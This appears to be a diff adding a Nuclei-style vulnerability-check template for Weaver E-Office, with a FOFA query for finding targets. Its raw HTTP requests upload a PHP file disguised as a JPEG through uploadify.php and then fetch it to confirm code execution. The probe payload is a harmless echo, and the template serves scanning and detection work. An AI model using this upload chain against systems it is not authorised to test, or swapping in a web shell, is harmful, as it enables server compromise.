@@ -1,0 +1,46 @@
+id: e-office-uploadify-upload
+info:
+  name: e-office-uploadify-upload
+  author: sb
+  severity: critical
+  tags: upload
+  description: 回显数字一般 9-10位
+  metadata:
+    fofa-query: app="泛微-EOffice"
+
+http:
+  - raw:
+      - |
+        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Content-Type: multipart/form-data; boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+        --gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s 
+        Content-Disposition: form-data; name="Filedata"; filename="demotest.php"
+        Content-Type: image/jpeg
+
+        <?php echo test;?> 
+        --gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s--
+        
+      - |
+        GET /attachment/{{token}}/demotest.php HTTP/1.1
+
+
+    extractors:
+      - type: regex
+        name: name
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - "([0-9]+)"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_2,"test")'
+    
+
+
+
